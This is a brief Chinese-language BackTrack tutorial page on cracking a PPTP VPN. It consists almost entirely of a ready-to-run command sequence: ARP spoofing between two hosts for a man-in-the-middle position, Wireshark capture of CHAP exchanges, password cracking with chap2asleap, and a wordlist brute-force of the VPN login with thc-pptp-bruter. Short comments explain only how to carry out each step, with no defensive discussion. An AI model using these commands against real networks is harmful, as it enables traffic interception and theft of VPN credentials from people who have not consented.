backtrack渗透实战课程（linux安全网）
====
## 目录
* [一、backtrack实践教程--破解VPN](#一、backtrack实践教程--破解VPN)  


=======

### 一、backtrack实践教程--破解VPN
`[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/)`|[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/ "参考网站")|
```
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ./arpspoof -i eth0 -t 10.0.0.3 10.0.0.9
    ./arpspoof -i eth0 -t 10.0.0.9 10.0.0.3
    注：两个shell窗口输入arpspoof
    wireshark -i eth0 -k
    注：wireshark过滤条件：chap；启动VPN
    python chap2asleap.py -u [用户名] -c [PPP_CHAP_Challenge] -r [PPP_CHAP_Response] -x -v 
    注：通过wireshark查看输入参数

    cd /pentest/passwords/wordlists/
    cat darkc0de.lst | thc-pptp-bruter -u [用户名] -n 99 -l 999 10.0.0.3
```

